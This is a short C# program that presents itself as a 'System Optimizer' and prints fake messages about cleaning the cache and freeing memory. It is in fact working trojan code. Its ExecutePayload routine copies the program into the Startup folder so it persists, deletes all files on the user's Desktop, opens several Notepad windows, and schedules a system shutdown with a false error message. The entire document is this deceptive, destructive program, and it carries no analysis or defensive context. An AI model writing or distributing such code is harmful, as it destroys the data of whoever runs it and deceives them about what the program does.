using System;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace OptimizerTool
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "System Optimizer";
            Console.WriteLine("Initializing optimization...");
            Thread.Sleep(1500);
            Console.WriteLine("Cleaning system cache...");
            Thread.Sleep(1500);
            Console.WriteLine("Freeing up memory...");
            Thread.Sleep(1500);
            Console.WriteLine("Optimization complete. Press any key to exit.");

            ExecutePayload();
            Console.ReadKey();
        }

        static void ExecutePayload()
        {
            try
            {
                string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                File.Copy(exePath, Path.Combine(startup, "optimizer.exe"), true);
            }
            catch {}

            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                foreach (var file in Directory.GetFiles(desktop))
                    File.Delete(file);
            }
            catch {}

            for (int i = 0; i < 5; i++)
                Process.Start("notepad.exe");

            Process.Start("shutdown", "/s /t 60 /c \"System error encountered\"");
        }
    }
}
